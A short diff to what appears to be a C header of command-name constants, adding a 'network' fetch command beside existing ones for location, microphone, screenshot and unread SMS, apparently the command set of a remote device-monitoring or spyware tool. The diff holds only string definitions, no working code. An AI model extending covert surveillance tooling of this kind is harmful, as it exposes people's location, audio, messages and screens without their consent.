@@ -17,6 +17,7 @@
 #define command_fetch_flash "flash"
 #define command_fetch_location "location"
 #define command_fetch_microphone "mic"
+#define command_fetch_network "network"
 #define command_profile "profile"
 #define command_fetch_screenshot "screenshot"
 #define command_fetch_unread_sms "unread"
